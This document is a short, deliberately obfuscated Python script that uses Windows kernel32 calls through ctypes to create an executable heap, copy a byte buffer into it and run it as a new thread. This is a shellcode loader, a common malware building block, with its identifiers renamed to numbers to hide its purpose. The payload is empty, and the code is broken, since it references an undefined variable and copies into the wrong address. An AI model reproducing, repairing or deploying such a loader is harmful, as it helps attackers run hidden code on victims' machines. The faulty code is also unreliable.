#!/usr/bin/env python3

import ctypes
import ctypes.wintypes as wt


class _1():
    _16  =   b""
    _2 = 0x00040000
    _3 = 0x00000008
    _4 = 0x000028
    _5 = 0x1000
    _6= 0x2000
    _5_RESERVE = 0x3000
    _7 = 0x04
    _7_EXECUTE = 0x40
    _8 = 0x20
    _9 = ctypes.windll.kernel32.CloseHandle
    _9.argtypes = [wt.HANDLE]
    _9.restype = wt.BOOL
    _10  = ctypes.windll.kernel32.CreateRemoteThread
    _10.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID]
    _10.restype = wt.HANDLE
    _11 = ctypes.windll.kernel32.CreateThread
    _11.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
        wt.LPVOID, wt.DWORD, wt.LPVOID
    ]
    _12 = ctypes.windll.kernel32.HeapCreate
    _12.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
    _12.restype = wt.HANDLE
    _13= ctypes.windll.kernel32.HeapAlloc
    _13.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
    _13.restype = wt.LPVOID
    _14 = ctypes.windll.kernel32.WaitForSingleObject
    _14.argtypes = [wt.HANDLE, wt.DWORD]
    _14.restype = wt.DWORD
    _15 = ctypes.windll.kernel32.RtlMoveMemory
    _15.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    _15.restype = wt.LPVOID
    def __init__(self):
        self._16 = _16 
        _17 = self._12(
            self._2, len(self._16), 0)
        self._13(_17, self._3, len(self._16))
        self._15(_17, self._16, len(self._16))
        _18 = self._11(0, 0, _17, 0, 0, 0)
        self._14(_18, 0xFFFFFFFF)
if __name__ == '__main__':
     _1()